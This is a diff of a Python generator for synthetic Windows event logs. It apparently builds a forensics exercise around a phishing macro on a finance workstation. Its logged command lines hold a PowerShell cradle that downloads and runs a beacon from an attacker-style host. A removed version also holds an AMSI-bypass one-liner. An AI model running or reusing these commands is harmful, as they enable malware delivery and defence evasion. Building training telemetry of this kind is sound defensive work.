   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="EventLog" />
       <EventID>6005</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:00.000Z" />
+      <TimeCreated SystemTime="2026-10-10T08:15:20.000Z" />
       <EventRecordID>4901</EventRecordID>
       <Channel>System</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
@@ -706,12 +894,12 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
     </EventData>
   </Event>
 
-  <!-- 2. System Boot: Operating System Version (6009) at 09:30:02Z -->
+  <!-- 2. System Boot: Operating System Version (6009) at 08:15:22Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="EventLog" />
       <EventID>6009</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:02.000Z" />
+      <TimeCreated SystemTime="2026-10-10T08:15:22.000Z" />
       <EventRecordID>4902</EventRecordID>
       <Channel>System</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
@@ -724,12 +912,12 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
     </EventData>
   </Event>
 
-  <!-- 3. Service Control Manager: Cryptographic Services running (7036) at 09:30:05Z -->
+  <!-- 3. Service Control Manager: Cryptographic Services running (7036) at 08:15:25Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Service Control Manager" Guid="{{555908d1-a6d7-4695-8e1e-26931d2012f4}}" />
       <EventID>7036</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:05.000Z" />
+      <TimeCreated SystemTime="2026-10-10T08:15:25.000Z" />
       <EventRecordID>4903</EventRecordID>
       <Channel>System</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
@@ -741,92 +929,30 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
     </EventData>
   </Event>
 
-  <!-- 4. Service Control Manager: Windows Update running (7036) at 09:30:06Z -->
+  <!-- 4. Group Policy Processing Succeeded (1500) at 08:15:30Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
-      <Provider Name="Service Control Manager" />
-      <EventID>7036</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:06.000Z" />
+      <Provider Name="Microsoft-Windows-GroupPolicy" />
+      <EventID>1500</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:15:30.000Z" />
       <EventRecordID>4904</EventRecordID>
       <Channel>System</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="param1">Windows Update</Data>
-      <Data Name="param2">running</Data>
+      <Data Name="SupportInfo1">1</Data>
+      <Data Name="SupportInfo2">5400</Data>
+      <Data Name="ProcessingTimeInMilliseconds">840</Data>
     </EventData>
   </Event>
 
-  <!-- 5. Service Control Manager: Background Intelligent Transfer Service running (7036) at 09:30:07Z -->
+  <!-- 5. Interactive Logon: TARGET\jdoe (4624, LogonType 2) at 08:29:45Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
-      <Provider Name="Service Control Manager" />
-      <EventID>7036</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:07.000Z" />
-      <EventRecordID>4905</EventRecordID>
-      <Channel>System</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="param1">Background Intelligent Transfer Service</Data>
-      <Data Name="param2">running</Data>
-    </EventData>
-  </Event>
-
-  <!-- 6. Service Control Manager: Print Spooler running (7036) at 09:30:08Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Service Control Manager" />
-      <EventID>7036</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:08.000Z" />
-      <EventRecordID>4906</EventRecordID>
-      <Channel>System</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="param1">Print Spooler</Data>
-      <Data Name="param2">running</Data>
-    </EventData>
-  </Event>
-
-  <!-- 7. Service Control Manager: Microsoft Defender Antivirus Service running (7036) at 09:30:09Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Service Control Manager" />
-      <EventID>7036</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:09.000Z" />
-      <EventRecordID>4907</EventRecordID>
-      <Channel>System</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="param1">Microsoft Defender Antivirus Service</Data>
-      <Data Name="param2">running</Data>
-    </EventData>
-  </Event>
-
-  <!-- 8. Defender Real-Time Protection Enabled (5000) at 09:30:10Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Windows Defender" />
-      <EventID>5000</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:30:10.000Z" />
-      <EventRecordID>4908</EventRecordID>
-      <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="ProductName">Microsoft Defender Antivirus</Data>
-    </EventData>
-  </Event>
-
-  <!-- 9. Normal User Interactive Logon: jdoe (4624) at 09:31:00Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}" />
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4624</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:31:00.000Z" />
-      <EventRecordID>4909</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T08:29:45.000Z" />
+      <EventRecordID>4905</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
@@ -834,113 +960,149 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
       <Data Name="TargetUserName">jdoe</Data>
       <Data Name="TargetDomainName">TARGET</Data>
       <Data Name="LogonType">2</Data>
-      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
       <Data Name="IpAddress">127.0.0.1</Data>
-      <Data Name="ProcessName">C:\\Windows\\System32\\winlogon.exe</Data>
+      <Data Name="WorkstationName">WKSTN-FIN-01</Data>
+      <Data Name="LogonProcessName">User32</Data>
+      <Data Name="AuthenticationPackageName">Negotiate</Data>
     </EventData>
   </Event>
 
-  <!-- 10. Kerberos TGT Request for jdoe (4768) at 09:31:02Z -->
+  <!-- 6. Special Privileges Assigned: TARGET\jdoe (4672) at 08:29:46Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4768</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:31:02.000Z" />
+      <EventID>4672</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:29:46.000Z" />
+      <EventRecordID>4906</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WKSTN-FIN-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">jdoe</Data>
+      <Data Name="SubjectDomainName">TARGET</Data>
+      <Data Name="PrivilegeList">SeChangeNotifyPrivilege</Data>
+    </EventData>
+  </Event>
+
+  <!-- 7. Process Creation: explorer.exe (4688) at 08:30:05Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:30:05.000Z" />
+      <EventRecordID>4907</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WKSTN-FIN-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">jdoe</Data>
+      <Data Name="NewProcessName">C:\Windows\explorer.exe</Data>
+      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\userinit.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- 8. Defender Antivirus Signatures Updated (2000) at 08:31:00Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Windows Defender" />
+      <EventID>2000</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:31:00.000Z" />
+      <EventRecordID>4908</EventRecordID>
+      <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
+      <Computer>WKSTN-FIN-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="Product Name">Microsoft Defender Antivirus</Data>
+      <Data Name="New Engine Version">1.1.24080.9</Data>
+      <Data Name="New Signature Version">1.417.102.0</Data>
+    </EventData>
+  </Event>
+
+  <!-- 9. Process Creation: chrome.exe browsing intranet (4688) at 08:32:10Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:32:10.000Z" />
+      <EventRecordID>4909</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WKSTN-FIN-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">jdoe</Data>
+      <Data Name="NewProcessName">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+      <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe" http://internal-portal.target.local/portal/home.html</Data>
+      <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
+    </EventData>
+  </Event>
+
+  <!-- 10. Process Creation: OUTLOOK.EXE (4688) at 08:45:20Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-10-10T08:45:20.000Z" />
       <EventRecordID>4910</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="TargetUserName">jdoe</Data>
-      <Data Name="TargetDomainName">TARGET.LOCAL</Data>
-      <Data Name="ServiceName">krbtgt</Data>
-      <Data Name="TicketOptions">0x40810010</Data>
-      <Data Name="TicketEncryptionType">0x12</Data>
-      <Data Name="IpAddress">10.0.4.15</Data>
+      <Data Name="SubjectUserName">jdoe</Data>
+      <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
+      <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"</Data>
+      <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
     </EventData>
   </Event>
 
-  <!-- 11. Process Creation: Explorer.exe (4688) at 09:31:05Z -->
+  <!-- 11. Process Creation: EXCEL.EXE opening Budget_2026.xlsx (4688) at 09:10:00Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:31:05.000Z" />
+      <TimeCreated SystemTime="2026-10-10T09:10:00.000Z" />
       <EventRecordID>4911</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Windows\\explorer.exe</Data>
-      <Data Name="CommandLine">C:\\Windows\\explorer.exe</Data>
-      <Data Name="ParentProcessName">C:\\Windows\\System32\\userinit.exe</Data>
+      <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE</Data>
+      <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" "C:\Users\jdoe\Documents\Budget_2026.xlsx"</Data>
+      <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
     </EventData>
   </Event>
 
-  <!-- 12. Process Creation: OUTLOOK.EXE (4688) at 09:35:00Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:35:00.000Z" />
-      <EventRecordID>4916</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data>
-      <Data Name="CommandLine">"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"</Data>
-      <Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data>
-    </EventData>
-  </Event>
-
-  <!-- 13. Sysmon Event 22: DNS Query to outlook.office365.com at 09:35:05Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Sysmon" />
-      <EventID>22</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:35:05.000Z" />
-      <EventRecordID>4917</EventRecordID>
-      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="Image">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data>
-      <Data Name="QueryName">outlook.office365.com</Data>
-      <Data Name="QueryResults">52.96.166.146</Data>
-    </EventData>
-  </Event>
-
-  <!-- 14. Document Printed: Event 307 at 09:42:00Z -->
+  <!-- 12. Print Spooler: Document Printed (307) at 09:15:30Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-PrintService" />
       <EventID>307</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:42:00.000Z" />
-      <EventRecordID>4921</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T09:15:30.000Z" />
+      <EventRecordID>4912</EventRecordID>
       <Channel>Microsoft-Windows-PrintService/Operational</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <UserData>
-      <DocumentPrinted xmlns="http://manifests.microsoft.com/win/2004/08/windows/printing">
-        <Param1>42</Param1>
-        <Param2>Q3_Financial_Quarterly_Forecast.pdf</Param2>
-        <Param3>jdoe</Param3>
-        <Param4>PRINTER-FIN-FLOOR2</Param4>
-        <Param5>4</Param5>
+      <DocumentPrinted xmlns="http://manifests.microsoft.com/win/2004/08/windows/printservice">
+        <Param1>Budget_2026.xlsx</Param1>
+        <Param2>jdoe</Param2>
+        <Param3>WKSTN-FIN-01</Param3>
+        <Param4>HP LaserJet Enterprise M608</Param4>
+        <Param5>winspool</Param5>
+        <Param6>1048576</Param6>
+        <Param7>4</Param7>
       </DocumentPrinted>
     </UserData>
   </Event>
 
-  <!-- 15. Workstation Locked (4800) at 09:48:00Z -->
+  <!-- 13. Workstation Locked (4800) at 09:30:00Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4800</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:48:00.000Z" />
-      <EventRecordID>4922</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T09:30:00.000Z" />
+      <EventRecordID>4913</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
@@ -950,13 +1112,13 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
     </EventData>
   </Event>
 
-  <!-- 16. Workstation Unlocked (4801) at 09:55:00Z -->
+  <!-- 14. Workstation Unlocked (4801) at 09:42:00Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4801</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:55:00.000Z" />
-      <EventRecordID>4923</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T09:42:00.000Z" />
+      <EventRecordID>4914</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
@@ -967,164 +1129,113 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
   </Event>
 
   <!-- ===================================================================== -->
-  <!-- SECTION B: Attack Execution, C2, Credential Dumping & Exfiltration    -->
+  <!-- SECTION B: Attack Chain Telemetry (09:59:30 - 10:01:25Z)              -->
   <!-- ===================================================================== -->
 
-  <!-- 17. Phishing Email Attachment Saved: OUTLOOK.EXE creates 02_weaponized_document.docm at 09:59:45Z -->
+  <!-- 15. Outlook Saving Phishing Attachment (Sysmon 11) at 09:59:30Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" />
       <EventID>11</EventID>
-      <TimeCreated SystemTime="2026-10-10T09:59:45.000Z" />
-      <EventRecordID>5000</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T09:59:30.000Z" />
+      <EventRecordID>5001</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="Image">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data>
-      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\02_weaponized_document.docm</Data>
-      <Data Name="CreationUtcTime">2026-10-10 09:59:45.000</Data>
+      <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
+      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\02_weaponized_document.docm</Data>
+      <Data Name="CreationUtcTime">2026-10-10 09:59:30.000</Data>
       <Data Name="Hashes">MD5={docm_md5},SHA256={docm_sha256}</Data>
     </EventData>
   </Event>
 
-  <!-- 18. User Opens Weaponized Document: WINWORD.EXE (4688) at 10:00:00Z -->
+  <!-- 16. Process Creation: WINWORD.EXE Opening Document (4688) at 10:00:00Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4688</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:00.000Z" />
-      <EventRecordID>5001</EventRecordID>
-      <Channel>Security</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
-      <Data Name="CommandLine">"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\jdoe\\AppData\\Local\\Temp\\02_weaponized_document.docm"</Data>
-      <Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE</Data>
-      <Data Name="Hashes">MD5={docm_md5},SHA256={docm_sha256}</Data>
-    </EventData>
-  </Event>
-
-  <!-- 19. Macro Execution: WINWORD.EXE spawns PowerShell cradle (4688) at 10:00:03Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Security-Auditing" />
-      <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:03.000Z" />
       <EventRecordID>5002</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
-      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); (New-Object System.Net.WebClient).DownloadFile('http://evil-payloads-delivery.org/beacon_updater.exe', 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'); Start-Process 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'"</Data>
-      <Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
+      <Data Name="NewProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="CommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" "C:\Users\jdoe\AppData\Local\Temp\02_weaponized_document.docm"</Data>
+      <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
+      <Data Name="Hashes">MD5={docm_md5},SHA256={docm_sha256}</Data>
     </EventData>
   </Event>
 
-  <!-- 20. PowerShell Script Block Logging (Event 4104) at 10:00:04Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-PowerShell" />
-      <EventID>4104</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:04.000Z" />
-      <EventRecordID>5003</EventRecordID>
-      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="MessageNumber">1</Data>
-      <Data Name="MessageTotal">1</Data>
-      <Data Name="ScriptBlockText">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); (New-Object System.Net.WebClient).DownloadFile('http://evil-payloads-delivery.org/beacon_updater.exe', 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'); Start-Process 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe'</Data>
-    </EventData>
-  </Event>
-
-  <!-- 21. Sysmon Event 22: DNS Query to C2 Domain at 10:00:05Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}" />
-      <EventID>22</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:05.000Z" />
-      <EventRecordID>5004</EventRecordID>
-      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
-      <Data Name="QueryName">evil-payloads-delivery.org</Data>
-      <Data Name="QueryResults">185.220.101.45</Data>
-    </EventData>
-  </Event>
-
-  <!-- 22. Defender Real-Time Protection Disabled (5001) at 10:00:07Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Windows Defender" />
-      <EventID>5001</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:07.000Z" />
-      <EventRecordID>5005</EventRecordID>
-      <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="ProductName">Microsoft Defender Antivirus</Data>
-      <Data Name="OldValue">Enabled</Data>
-      <Data Name="NewValue">Disabled</Data>
-    </EventData>
-  </Event>
-
-  <!-- 23. Sysmon Event 11: File Create for beacon_updater.exe at 10:00:08Z -->
-  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
-    <System>
-      <Provider Name="Microsoft-Windows-Sysmon" />
-      <EventID>11</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:08.000Z" />
-      <EventRecordID>5006</EventRecordID>
-      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
-      <Computer>WKSTN-FIN-01.target.local</Computer>
-    </System>
-    <EventData>
-      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
-      <Data Name="TargetFilename">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
-      <Data Name="CreationUtcTime">2026-10-10 10:00:08.000</Data>
-      <Data Name="Hashes">MD5={pe_md5},SHA256={pe_sha256}</Data>
-    </EventData>
-  </Event>
-
-  <!-- 24. Process Creation (4688) for beacon_updater.exe at 10:00:10Z -->
+  <!-- 17. Process Creation: PowerShell Cradle from Macro (4688) at 10:00:05Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4688</EventID>
-      <TimeCreated SystemTime="2026-10-10T10:00:10.000Z" />
-      <EventRecordID>5007</EventRecordID>
+      <TimeCreated SystemTime="2026-10-10T10:00:05.000Z" />
+      <EventRecordID>5003</EventRecordID>
       <Channel>Security</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
       <Data Name="SubjectUserName">jdoe</Data>
-      <Data Name="NewProcessName">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
-      <Data Name="CommandLine">"C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe" -c2 185.220.101.45:443 -interval 5</Data>
-      <Data Name="ParentProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://evil-payloads-delivery.org/beacon_updater.exe', 'C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe'); Start-Process 'C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe'"</Data>
+      <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+    </EventData>
+  </Event>
+
+  <!-- 18. Sysmon Event 11: File Create for beacon_updater.exe at 10:00:08Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>11</EventID>
+      <TimeCreated SystemTime="2026-10-10T10:00:08.000Z" />
+      <EventRecordID>5004</EventRecordID>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WKSTN-FIN-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="TargetFilename">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
+      <Data Name="CreationUtcTime">2026-10-10 10:00:08.000</Data>
       <Data Name="Hashes">MD5={pe_md5},SHA256={pe_sha256}</Data>
     </EventData>
   </Event>
 
-  <!-- 25. Sysmon Event 3: Network Connection to C2 Server (185.220.101.45:443) at 10:00:15Z -->
+  <!-- 19. Process Creation: beacon_updater.exe execution (4688) at 10:00:10Z -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-10-10T10:00:10.000Z" />
+      <EventRecordID>5005</EventRecordID>
+      <Channel>Security</Channel>
+      <Computer>WKSTN-FIN-01.target.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">jdoe</Data>
+      <Data Name="NewProcessName">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
+      <Data Name="CommandLine">"C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe" -c2 185.220.101.45:443 -interval 5</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="Hashes">MD5={pe_md5},SHA256={pe_sha256}</Data>
+    </EventData>
+  </Event>
+
+  <!-- 20. Sysmon Event 3: Network Connection to C2 Server (185.220.101.45:443) at 10:00:15Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Sysmon" />
       <EventID>3</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:15.000Z" />
-      <EventRecordID>5008</EventRecordID>
+      <EventRecordID>5006</EventRecordID>
       <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
       <Computer>WKSTN-FIN-01.target.local</Computer>
     </System>
     <EventData>
-      <Data Name="Image">C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe</Data>
+      <Data Name="Image">C:\Users\jdoe\AppData\Local\Temp\beacon_updater.exe</Data>
       <Data Name="SourceIp">10.0.4.15</Data>
       <Data Name="SourcePort">49812</Data>
       <Data Name="DestinationIp">185.220.101.45</Data>
@@ -1133,103 +1244,67 @@ def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: s
     </EventData>
   </Event>
 
-  <!-- 26. Process Creation: Discovery LOLBin whoami.exe (4688) at 10:00:18Z -->
+  <!-- 21. Process Creation: Discovery LOLBin whoami.exe (4688) at 10:00:18Z -->
   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
     <System>
       <Provider Name="Microsoft-Windows-Security-Auditing" />
       <EventID>4688</EventID>
       <TimeCreated SystemTime="2026-10-10T10:00:18.000Z" />
